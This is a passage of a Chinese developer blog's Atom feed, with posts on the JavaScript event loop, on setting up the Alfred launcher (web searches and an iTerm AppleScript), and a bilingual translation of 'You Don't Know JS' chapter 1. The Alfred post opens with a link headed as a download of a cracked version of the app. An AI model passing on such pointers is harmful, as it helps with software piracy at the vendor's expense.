setTimeout</span><br><span class="line"></span><br><span class="line">Log:  script start、 script end、promise1、promise2</span><br><span class="line"></span><br><span class="line">#过程七:</span><br><span class="line"></span><br><span class="line">MicroTask: </span><br><span class="line">MacroTask:</span><br><span class="line"></span><br><span class="line">call-Task:</span><br><span class="line"></span><br><span class="line">Log:  script start、 script end、promise1、promise2、setTimeout</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;请问下面输出的结果是什么&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;console.log(&amp;apos;script start&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;setTimeout(function() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  console.log(&amp;apos;setTimeout&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;, 0);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Promise.resolve().then(function() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  console.log(&amp;apos;promise1&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;).then(function() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  console.log(&amp;apos;promise2&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;console.log(&amp;apos;script end&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;纳尼？？仿佛又回想了当初被面试官支配时的恐惧了！！&lt;/p&gt;
&lt;p&gt;骚年稳住别慌，这道面试题考察的是你对Event loop事件循环的理解，当你深入了解浏览器或Node中如何处理事件循环的时候，上面此类题目对你来说就是so easy，好了话不多说让我们快速进入正题吧。&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>alfred工具</title>
    <link href="http://zhoushaw.github.io/2019/03/01/other/tool/Alfred3/"/>
    <id>http://zhoushaw.github.io/2019/03/01/other/tool/Alfred3/</id>
    <published>2019-02-28T18:44:53.000Z</published>
    <updated>2019-05-26T11:54:31.189Z</updated>
    
    <content type="html"><![CDATA[<div><a id="more"></a></div><h2 id="下载破解版"><a href="#下载破解版" class="headerlink" title="下载破解版"></a>下载破解版</h2><p><a href="https://www.jianshu.com/p/5b3f98b1f7b6" target="_blank" rel="noopener">文章地址</a></p><h2 id="功能使用"><a href="#功能使用" class="headerlink" title="功能使用"></a>功能使用</h2><p><a href="https://juejin.im/post/5b0e99436fb9a009e405dbb6" target="_blank" rel="noopener">掘金地址</a></p><h2 id="web搜索设置"><a href="#web搜索设置" class="headerlink" title="web搜索设置"></a>web搜索设置</h2><ul><li>百度:<a href="https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;wd={query}" target="_blank" rel="noopener">https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;wd={query}</a></li><li>stackoverflow:<a href="http://www.stackoverflow.com/search?q={query}" target="_blank" rel="noopener">http://www.stackoverflow.com/search?q={query}</a></li><li>githubUser:<a href="https://github.com/{query}" target="_blank" rel="noopener">https://github.com/{query}</a></li><li>githubSearch:<a href="https://github.com/search?utf8=%E2%9C%93&amp;q={query}" target="_blank" rel="noopener">https://github.com/search?utf8=%E2%9C%93&amp;q={query}</a></li><li>MDN:<a href="https://developer.mozilla.org/zh-CN/search?q={query}" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/search?q={query}</a></li><li>juejin: <a href="https://juejin.im/search?query={query}" target="_blank" rel="noopener">https://juejin.im/search?query={query}</a></li></ul><h2 id="alfred集成iterm2"><a href="#alfred集成iterm2" class="headerlink" title="alfred集成iterm2"></a>alfred集成iterm2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">on alfred_script(q)</span><br><span class="line">if application &quot;iTerm&quot; is running or application &quot;iTerm&quot; is running then</span><br><span class="line">run script &quot;</span><br><span class="line">on run &#123;q&#125;</span><br><span class="line">tell application \&quot;:Applications:iTerm.app\&quot;</span><br><span class="line">activate</span><br><span class="line">try</span><br><span class="line">select first window</span><br><span class="line">set onlywindow to false</span><br><span class="line">on error</span><br><span class="line">create window with default profile</span><br><span class="line">select first window</span><br><span class="line">set onlywindow to true</span><br><span class="line">end try</span><br><span class="line">tell current session of the first window</span><br><span class="line">if onlywindow is false then</span><br><span class="line">tell split vertically with default profile</span><br><span class="line">write text q</span><br><span class="line">end tell</span><br><span class="line">end if</span><br><span class="line">end tell</span><br><span class="line">end tell</span><br><span class="line">end run</span><br><span class="line">&quot; with parameters &#123;q&#125;</span><br><span class="line">else</span><br><span class="line">run script &quot;</span><br><span class="line">on run &#123;q&#125;</span><br><span class="line">tell application \&quot;:Applications:iTerm.app\&quot;</span><br><span class="line">activate</span><br><span class="line">try</span><br><span class="line">select first window</span><br><span class="line">on error</span><br><span class="line">create window with default profile</span><br><span class="line">select first window</span><br><span class="line">end try</span><br><span class="line">tell the first window</span><br><span class="line">tell current session to write text q</span><br><span class="line">end tell</span><br><span class="line">end tell</span><br><span class="line">end run</span><br><span class="line">&quot; with parameters &#123;q&#125;</span><br><span class="line">end if</span><br><span class="line">end alfred_script</span><br></pre></td></tr></table></figure><h2 id="workflows"><a href="#workflows" class="headerlink" title="workflows"></a>workflows</h2><blockquote><p>有道</p></blockquote><p><a href="https://github.com/kaiye/workflows-youdao/" target="_blank" rel="noopener">https://github.com/kaiye/workflows-youdao/</a></p><h2 id="修复alfred工作流错误"><a href="#修复alfred工作流错误" class="headerlink" title="修复alfred工作流错误"></a>修复alfred工作流错误</h2><ul><li><p><a href="https://github.com/deanishe/alfred-fixum/releases/tag/v0.8" target="_blank" rel="noopener">fixum修复工具下载</a></p></li><li><p>导入<code>Fixum-0.8.alfredworkflow</code>修复工具</p></li><li>打开alfred快捷搜索，输入<code>fixum</code>,选择<code>fix workflows</code></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;div&gt;
    
    </summary>
    
      <category term="tool" scheme="http://zhoushaw.github.io/categories/tool/"/>
    
    
      <category term="alfred" scheme="http://zhoushaw.github.io/tags/alfred/"/>
    
  </entry>
  
  <entry>
    <title>译文:you don&#39;t know js 之 Into Programming</title>
    <link href="http://zhoushaw.github.io/2019/02/28/learning/book-notes/you&#39;s%20not%20know%20javascript/Into%20Programming/"/>
    <id>http://zhoushaw.github.io/2019/02/28/learning/book-notes/you&#39;s not know javascript/Into Programming/</id>
    <published>2019-02-28T00:20:15.000Z</published>
    <updated>2019-04-14T13:54:11.946Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Chapter-1-Into-Programming"><a href="#Chapter-1-Into-Programming" class="headerlink" title="Chapter 1: Into Programming"></a>Chapter 1: Into Programming</h2><p>Welcome to the You Don’t Know JS (YDKJS) series.</p><p>欢迎来到你不懂js系列</p><div><a id="more"></a></div><p>Up &amp; Going is an introduction to several basic concepts of programming – of course we lean toward JavaScript (often abbreviated JS) specifically – and how to approach and understand the rest of the titles in this series. Especially if you’re just getting into programming and/or JavaScript, this book will briefly explore what you need to get up and going.</p><p>Up &amp; Going是为了介绍程序基本概念的，当然我们特别倾向于javascript(通常简称为JS)，如何看待与裂解本系列其他书目。如果你准备好进入程序或者javascript了。这本书将简单浏览你需要什么来入门与进阶。</p><p>This book starts off explaining the basic principles of programming at a very high level. It’s mostly intended if you are starting YDKJS with little to no prior programming experience, and are looking to these books to help get you started along a path to understanding programming through the lens of JavaScript.</p><p>本书开始解释程序的基础原则在很高的级别。如果你开始阅读YDKJS带有较少或没有程序经验并且寻找这些书通过javascrpt去帮助你开始理解程序，那么本书的主要目的就是帮助你了解如何开始YDKJS。</p><p>Chapter 1 should be approached as a quick overview of the things you’ll want to learn more about and practice to get into programming. There are also many other fantastic programming introduction resources that can help you dig into these topics further, and I encourage you to learn from them in addition to this chapter.</p><p>第一章应该适合快速的预览你想要学习和训练进入程序。这里有很多能帮助你深入这些话题的有用的程序资源，我鼓励你在这一章之外向他们学习。</p><p>Once you feel comfortable with general programming basics, Chapter 2 will help guide you to a familiarity with JavaScript’s flavor of programming. Chapter 2 introduces what JavaScript is about, but again, it’s not a comprehensive guide – that’s what the rest of the YDKJS books are for!</p><p>一旦你对普通的程序基础适应了，第二章将会帮助你熟悉javascript的程序。第二章介绍了javascript是关于什么的，再者，它不只是全面的指南 – 这是其余YDKJS系列书的作用。</p><p>If you’re already fairly comfortable with JavaScript, first check out Chapter 3 as a brief glimpse of what to expect from YDKJS, then jump right in!</p><p>如果你已经很熟练javascript，那么首先快速的预览一下第三章，然后快速的进入学习吧。</p><p>##Code</p><p>Let’s start from the beginning.</p><p>让我们从这开始吧。</p><p>A program, often referred to as source code or just code, is a set of special instructions to tell the computer what tasks to perform. Usually code is saved in a text file, although with JavaScript you can also type code directly into a developer console in a browser, which we’ll cover shortly.</p><p>一个程序，经常被交付源码或者就是编码，去设置了一个特殊的介绍告诉计算机哪些任务被执行。通常代码被使用文本文件存储，通过javascript，你也可以输入代码直接在浏览器的开发者区输入代码，稍后我们会讲到这一点。</p><p>The rules for valid format and combinations of instructions is called a computer language, sometimes referred to as its syntax, much the same as English tells you how to spell words and how to create valid sentences using words and punctuation.</p><p>有效的格式和混合的指令被称之为计算机语言，有时被作为它的预发，更像是英语告诉你如何使用单词和标点拼写单词并且如何创造有效的句子。</p><p>##Statements</p><p>In a computer language, a group of words, numbers, and operators that performs a specific task is a statement. In JavaScript, a statement might look as follows:</p><p>在计算机中，一组单词、数字和运算符执行一个特殊的任务是一个句子。在javascript中一个句子可能看来像下面这样:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = b * 2;</span><br></pre></td></tr></table></figure><p>The characters a and b are called variables (see “Variables”), which are like simple boxes you can store any of your stuff in. In programs, variables hold values (like the number 42) to be used by the program. Think of them as symbolic placeholders for the values themselves.</p><p>字符a和b被称之为变量，就像是一个你能存储任何东西在里面的盒子。在程序中，变量存放值(像数字42)来给程序用。将他们看做值本身的符号占位符。</p><p>By contrast, the 2 is just a value itself, called a literal value, because it stands alone without being stored in a variable.</p><p>相比之下，2就是这个值的本身，称之为字面量。因为它独立存在没有存在任何变量中。</p><p>The = and * characters are operators (see “Operators”) – they perform actions with the values and variables such as assignment and mathematic multiplication.</p><p>=和*字符是操作符 – 他们使用值和变量执行运算相比如赋值和乘法运算。</p><p>Most statements in JavaScript conclude with a semicolon (;) at the end.</p><p>大多javascript声明的结尾带有;号。</p><p>The statement a = b <em> 2; tells the computer, roughly, to get the current value stored in the variable b, multiply that value by 2, then store the result back into another variable we call a.<br>a = b </em>2声明告诉计算机，概略的是，获取当前值存储在变量b中，乘2，然后存储到我们称之为a的变量中。</p><p>Programs are just collections of many such statements, which together describe all the steps that it takes to perform your program’s purpose.</p><p>程序就是有相当多的声明，这些声明一同描述了它执行你程序目的的所有步骤。</p><h2 id="Expressions"><a href="#Expressions" class="headerlink" title="Expressions"></a>Expressions</h2><p>Statements are made up of one or more expressions. An expression is any reference to a variable or value, or a set of variable(s) and value(s) combined with operators.</p><p>声明是由一个或多个表达式构成的。</p><p>For example:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = b * 2;</span><br></pre></td></tr></table></figure><p>This statement has four expressions in it:</p><p>这个声明有四个表达式:</p><p>2 is a literal value expression</p><p>2是一个字面量表达式</p><p>b is a variable expression, which means to retrieve its current value</p><p>b是一个变量表达式，它检索当前的值</p><p>b * 2 is an arithmetic expression, which means to do the multiplication</p><p>b * 2 是一个算术表达式，意味着乘法</p><p>a = b <em> 2 is an assignment expression, which means to assign the result of the b </em> 2 expression to the variable a (more on assignments later)</p><p>a = b <em> 2是一个任务表达式，以为着b </em> 2表达式的结果存储到变量a上</p><p>A general expression that stands alone is also called an expression statement, such as the following:</p><p>一般表达式独立存在的也称之为表达式语句，例如下面的</p><p>b * 2;<br>This flavor of expression statement is not very common or useful, as generally it wouldn’t have any effect on the running of the program – it would retrieve the value of b and multiply it by 2, but then wouldn’t do anything with that result.<br>这种风格的表达式语句不是很常见和有效，运行这个程序通常不会产生任何影响 – 它将会检索b的值然后乘2，但是不会对结果做任何处理</p><p>A more common expression statement is a call expression statement (see “Functions”), as the entire statement is the function call expression itself:</p><p>一个最常见的声明语句是调用表达式语句(参见函数)，整个表达式语句被称之为函数它自己。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert( a );</span><br></pre></td></tr></table></figure></p><h2 id="Executing-a-Program"><a href="#Executing-a-Program" class="headerlink" title="Executing a Program"></a>Executing a Program</h2><p>How do those collections of programming statements tell the computer what to do? The program needs to be executed, also referred to as running the program.</p><p>如何通过这些收集的程序语句来告诉计算机做什么？程序需要被执行，也被称为运行项目。</p><p>Statements like a = b * 2 are helpful for developers when reading and writing, but are not actually in a form the computer can directly understand. So a special utility on the computer (either an interpreter or a compiler) is used to translate the code you write into commands a computer can understand.</p><p>在阅读和编写时像<code>a = b *2</code>这样的语句对于开发者来说是有帮助的，但是事实上计算机不能直接理解。所以在计算机中(也可以是 一个翻译者 或 编译者)一个特殊的工具被用来翻译你写的代码转变成计算机能够理解的命令。</p><p>For some computer languages, this translation of commands is typically done from top to bottom, line by line, every time the program is run, which is usually called interpreting the code.</p><p>对于一些计算机语言，翻译命令通常是从上至下翻译，一行一行向下，每次运行程序，通常被称之为解析代码。</p><p>For other languages, the translation is done ahead of time, called compiling the code, so when the program runs later, what’s running is actually the already compiled computer instructions ready to go.</p><p>对于一些其他语言，提前翻译完成，称之为编译代码，所以当程序稍后运行时，他运行的实际上是已经编译完成能够运行的计算机结构。</p><p>It’s typically asserted that JavaScript is interpreted, because your JavaScript source code is processed each time it’s run. But that’s not entirely accurate. The JavaScript engine actually compiles the program on the fly and then immediately runs the compiled code.</p><p>一般宣称JavaScript为解释性语言，因为每次运行JavaScript源码是都会处理它。但是不是完全精准，JavaScript引擎动态编译代码，并且立即运行编译的代码。</p><p>Note: For more information on JavaScript compiling, see the first two chapters of the Scope &amp; Closures title of this series.</p><p>笔记:更多关于JavaScript的编译信息，看这一系列的作用域 &amp; 闭包的标题的前两章。</p><p>##Try It Yourself</p><p>This chapter is going to introduce each programming concept with simple snippets of code, all written in JavaScript (obviously!).</p><p>这一章是使用简单的一段代码来讲述每一段程序的概念，所有使用代码JavaScript编写的(显而易见的！)</p><p>It cannot be emphasized enough: while you go through this chapter – and you may need to spend the time to go over it several times – you should practice each of these concepts by typing the code yourself. The easiest way to do that is to open up the developer tools console in your nearest browser (Firefox, Chrome, IE, etc.).</p><p>这一点无论如何强调都不过分: 当你开始阅读这一章 – 并且你可能需要花一些时间去反复阅读它。你应该通过编写代码来锻炼这些概念。最简单的方式是打开最近的浏览器的开发者工具(火狐、谷歌、Ie，其他)</p><p>Tip: Typically, you can launch the developer console with a keyboard shortcut or from a menu item. For more detailed information about launching and using the console in your favorite browser, see “Mastering The Developer Tools Console” (<a href="http://blog.teamtreehouse.com/mastering-developer-tools-console)" target="_blank" rel="noopener">http://blog.teamtreehouse.com/mastering-developer-tools-console)</a>. To type multiple lines into the console at once, use <shift> + <enter> to move to the next new line. Once you hit <enter> by itself, the console will run everything you’ve just typed.</enter></enter></shift></p><p>提示:通常，你可以通过键盘的快捷键或者菜单选项打开开发者输入台，更多关于在你最喜欢的浏览器中打开和使用控制台，请看“掌握开发者控制台” (<a href="http://blog.teamtreehouse.com/mastering-developer-tools-console)，一次在控制台中输入多行，使用" target="_blank" rel="noopener">http://blog.teamtreehouse.com/mastering-developer-tools-console)，一次在控制台中输入多行，使用</a><shift> + <enter> 移动光标到下一行，一旦你按下回车，控制台将会运行你输入的一切。</enter></shift></p><p>Let’s get familiar with the process of running code in the console. First, I suggest opening up an empty tab in your browser. I prefer to do this by typing about:blank into the address bar. Then, make sure your developer console is open, as we just mentioned.</p><p>让我们熟悉一下在控台内代码运行的过程。首先，我建议你在你的浏览器上打开一个新的标签，我更喜欢在地址栏输入<code>about:blank</code>，然后，确保你的开发者控制台是打开的，就像我们刚才提及的那样。</p><p>Now, type this code and see how it runs:</p><p>现在，输入这段代码然后看它执行:</p><p>a = 21;</p><p>b = a * 2;</p><p>console.log( b );<br>Typing the preceding code into the console in Chrome should produce something like the following:</p><p>输入过程之前的代码到谷歌控制台应该产生一些向下面的事情:</p><p>Go on, try it. The best way to learn programming is to start coding!</p><p>继续，试试看。学习程序最好的方法是开始编码。</p><h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><p>In the previous code snippet, we used console.log(..). Briefly, let’s look at what that line of code is all about.</p><p>在先前的代码片段，我们使用了console.log(..).短暂的，让我们寻找一下这一行代码是关于什么的。</p><p>You may have guessed, but that’s exactly how we print text (aka output to the user) in the developer console. There are two characteristics of that statement that we should explain.</p><p>你可能已经猜到了，但是那正是我们如何在开发者控制台中打印文本(输入用户名)，我们应该解释这个语句中的那两个字符。</p><p>First, the log( b ) part is referred to as a function call (see “Functions”). What’s happening is we’re handing the b variable to that function, which asks it to take the value of b and print it to the console.</p><p>首先，这个log(b)部分被称为函数(看 “函数”)。我们将变量b交给这个函数发生了什么，这个函数要求它取b的值并且打印在控制台上。</p><p>Second, the console. part is an object reference where the log(..) function is located. We cover objects and their properties in more detail in Chapter 2.</p><p>第二，<code>console.</code>部分是位于<code>log(..)</code>函数部分对象的引用，我们在第二章介绍了对象和他们属性更多的细节。</p><p>Another way of creating output that you can see is to run an alert(..) statement. For example:</p><p>你能看到其他方式创建输出语句是使用<code>alert()</code>语句。例如:</p><p>alert( b );<br>If you run that, you’ll notice that instead of printing the output to the console, it shows a popup “OK” box with the contents of the b variable. However, using console.log(..) is generally going to make learning about coding and running your programs in the console easier than using alert(..), because you can output many values at once without interrupting the browser interface.</p><p>如果你运行这段代码，你将会注意到它代替了输出在控制台上,它显示一个弹出的“ok”框带有变量b的内容。然而，通常使用<code>console.log(..)</code>学习关于编程和运行程序比使用<code>alert(..)</code>更容易，因为你可以一次性输出很多值并且不会中断页面。</p><p>For this book, we’ll use console.log(..) for output.</p><p>对于本书，我们使用<code>console.log(..)</code>来输出</p><p>##Input</p><p>While we’re discussing output, you may also wonder about input (i.e., receiving information from the user).</p><p>当我们在讨论输出时，你可能也想要知道输入(接收用户的信息)</p><p>The most common way that happens is for the HTML page to show form elements (like text boxes) to a user that they can type into, and then using JS to read those values into your program’s variables.</p><p>发生这种最常见的方式是HTML页面展示表单元素(想文本输入框)给用户输入，然后使用JS去读取这些变量到你程序的变量中。</p><p>But there’s an easier way to get input for simple learning and demonstration purposes such as what you’ll be doing throughout this book. Use the prompt(..) function:</p><p>但是最简单方式的获取用户输入对于简单的学习和演示目的，比如你将要通过本书来做的。使用<code>prompt(..)</code>函数:</p><p>age = prompt( “Please tell me your age:” );</p><p>console.log( age );<br>As you may have guessed, the message you pass to prompt(..) – in this case, “Please tell me your age:” – is printed into the popup.</p><p>你可能已经猜到了，你输入到<code>prompt(..)</code>的信息 –在这个案例里。“请告诉我你的名字:” – 打印在这个弹窗上。</p><p>This should look similar to the following:</p><p>看起来跟下列的很相似:</p><p>Once you submit the input text by clicking “OK,” you’ll observe that the value you typed is stored in the age variable, which we then output with console.log(..):</p><p>一旦你通过点击“ok”来提交输入文本，你将会观察到你输入的将会存储到age变量中，然后我们通过<code>console.log(..)</code>输出变量</p><p>To keep things simple while we’re learning basic programming concepts, the examples in this book will not require input. But now that you’ve seen how to use prompt(..), if you want to challenge yourself you can try to use input in your explorations of the examples.</p><p>当我们学习基础程序概念时保持简单，在这本书的案例中将不需要输入。但是现在你已经知道如何使用<code>prompt(..)</code>，如果你想要挑战你自己你可以尝试使用input来探索这个案例。</p><h2 id="Operators"><a href="#Operators" class="headerlink" title="Operators"></a>Operators</h2><p>Operators are how we perform actions on variables and values. We’ve already seen two JavaScript operators, the = and the *.</p><p>操作符是我们如何操作变量和值，我们已经看到两个JavaScript操作符，=号和*号。</p><p>The * operator performs mathematic multiplication. Simple enough, right?</p><p>*号操作符执行数学乘法运算，很简单对吗？</p><p>The = equals operator is used for assignment – we first calculate the value on the right-hand side (source value) of the = and then put it into the variable that we specify on the left-hand side (target variable).</p><p>=号操作符通常用来复制– 我们首先计算等号右边的值然后将值=号左边的变量中(目标变量).</p><p>Warning: This may seem like a strange reverse order to specify assignment. Instead of a = 42, some might prefer to flip the order so the source value is on the left and the target variable is on the right, like 42 -&gt; a (this is not valid JavaScript!). Unfortunately, the a = 42 ordered form, and similar variations, is quite prevalent in modern programming languages. If it feels unnatural, just spend some time rehearsing that ordering in your mind to get accustomed to it.</p><p>Consider:</p><p>a = 2;<br>b = a + 1;<br>Here, we assign the 2 value to the a variable. Then, we get the value of the a variable (still 2), add 1 to it resulting in the value 3, then store that value in the b variable.</p><p>While not technically an operator, you’ll need the keyword var in every program, as it’s the primary way you declare (aka create) variables (see “Variables”).</p><p>You should always declare the variable by name before you use it. But you only need to declare a variable once for each scope (see “Scope”); it can be used as many times after that as needed. For example:</p><p>var a = 20;</p><p>a = a + 1;<br>a = a * 2;</p><p>console.log( a );    // 42<br>Here are some of the most common operators in JavaScript:</p><p>Assignment: = as in a = 2.</p><p>Math: + (addition), - (subtraction), <em> (multiplication), and / (division), as in a </em> 3.</p><p>Compound Assignment: +=, -=, *=, and /= are compound operators that combine a math operation with assignment, as in a += 2 (same as a = a + 2).</p><p>Increment/Decrement: ++ (increment), – (decrement), as in a++ (similar to a = a + 1).</p><p>Object Property Access: . as in console.log().</p><p>Objects are values that hold other values at specific named locations called properties. obj.a means an object value called obj with a property of the name a. Properties can alternatively be accessed as obj[“a”]. See Chapter 2.</p><p>Equality: == (loose-equals), === (strict-equals), != (loose not-equals), !== (strict not-equals), as in a == b.</p><p>See “Values &amp; Types” and Chapter 2.</p><p>Comparison: &lt; (less than), &gt; (greater than), &lt;= (less than or loose-equals), &gt;= (greater than or loose-equals), as in a &lt;= b.</p><p>See “Values &amp; Types” and Chapter 2.</p><p>Logical: &amp;&amp; (and), || (or), as in a || b that selects either a or b.</p><p>These operators are used to express compound conditionals (see “Conditionals”), like if either a or b is true.</p><p>Note: For much more detail, and coverage of operators not mentioned here, see the Mozilla Developer Network (MDN)’s “Expressions and Operators” (<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Expressions_and_Operators)" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Expressions_and_Operators)</a>.</p><p>Values &amp; Types<br>If you ask an employee at a phone store how much a certain phone costs, and they say “ninety-nine, ninety-nine” (i.e., $99.99), they’re giving you an actual numeric dollar figure that represents what you’ll need to pay (plus taxes) to buy it. If you want to buy two of those phones, you can easily do the mental math to double that value to get $199.98 for your base cost.</p><p>If that same employee picks up another similar phone but says it’s “free” (perhaps with air quotes), they’re not giving you a number, but instead another kind of representation of your expected cost ($0.00) – the word “free.”</p><p>When you later ask if the phone includes a charger, that answer could only have been either “yes” or “no.”</p><p>In very similar ways, when you express values in a program, you choose different representations for those values based on what you plan to do with them.</p><p>These different representations for values are called types in programming terminology. JavaScript has built-in types for each of these so called primitive values:</p><p>When you need to do math, you want a number.<br>When you need to print a value on the screen, you need a string (one or more characters, words, sentences).<br>When you need to make a decision in your program, you need a boolean (true or false).<br>Values that are included directly in the source code are called literals. string literals are surrounded by double quotes “…” or single quotes (‘…’) – the only difference is stylistic preference. number and boolean literals are just presented as is (i.e., 42, true, etc.).</p><p>Consider:</p><p>“I am a string”;<br>‘I am also a string’;</p><p>42;</p><p>true;<br>false;<br>Beyond string/number/boolean value types, it’s common for programming languages to provide arrays, objects, functions, and more. We’ll cover much more about values and types throughout this chapter and the next.</p><p>Converting Between Types<br>If you have a number but need to print it on the screen, you need to convert the value to a string, and in JavaScript this conversion is called “coercion.” Similarly, if someone enters a series of numeric characters into a form on an ecommerce page, that’s a string, but if you need to then use that value to do math operations, you need to coerce it to a number.</p><p>JavaScript provides several different facilities for forcibly coercing between types. For example:</p><p>var a = “42”;<br>var b = Number( a );</p><p>console.log( a );    // “42”<br>console.log( b );    // 42<br>Using Number(..) (a built-in function) as shown is an explicit coercion from any other type to the number type. That should be pretty straightforward.</p><p>But a controversial topic is what happens when you try to compare two values that are not already of the same type, which would require implicit coercion.</p><p>When comparing the string “99.99” to the number 99.99, most people would agree they are equivalent. But they’re not exactly the same, are they? It’s the same value in two different representations, two different types. You could say they’re “loosely equal,” couldn’t you?</p><p>To help you out in these common situations, JavaScript will sometimes kick in and implicitly coerce values to the matching types.</p><p>So if you use the == loose equals operator to make the comparison “99.99” == 99.99, JavaScript will convert the left-hand side “99.99” to its number equivalent 99.99. The comparison then becomes 99.99 == 99.99, which is of course true.</p><p>While designed to help you, implicit coercion can create confusion if you haven’t taken the time to learn the rules that govern its behavior. Most JS developers never have, so the common feeling is that implicit coercion is confusing and harms programs with unexpected bugs, and should thus be avoided. It’s even sometimes called a flaw in the design of the language.</p><p>However, implicit coercion is a mechanism that can be learned, and moreover should be learned by anyone wishing to take JavaScript programming seriously. Not only is it not confusing once you learn the rules, it can actually make your programs better! The effort is well worth it.</p><p>Note: For more information on coercion, see Chapter 2 of this title and Chapter 4 of the Types &amp; Grammar title of this series.</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Chapter-1-Into-Programming&quot;&gt;&lt;a href=&quot;#Chapter-1-Into-Programming&quot; class=&quot;headerlink&quot; title=&quot;Chapter 1: Into Programming&quot;&gt;&lt;/a&gt;Chapter 1: Into Programming&lt;/h2&gt;&lt;p&gt;Welcome to the You Don’t Know JS (YDKJS) series.&lt;/p&gt;
&lt;p&gt;欢迎来到你不懂js系列&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="book" scheme="http://zhoushaw.github.io/tags/book/"/>
    
  </entry>
  
  <entry>
    <title>译文:you don&#39;t know js 之 Into YDKJS</title>
    <link href="http://zhoushaw.github.io/2019/02/26/learning/book-notes/you&#39;s%20not%20know%20javascript/Into%20YDKJS/"/>
    <id>http://zhoushaw.github.io/2019/02/26/learning/book-notes/you&#39;s not know javascript/Into YDKJS/</id>
    <published>2019-02-26T02:42:35.000Z</published>
    <updated>2019-04-14T13:54:11.946Z</updated>
    
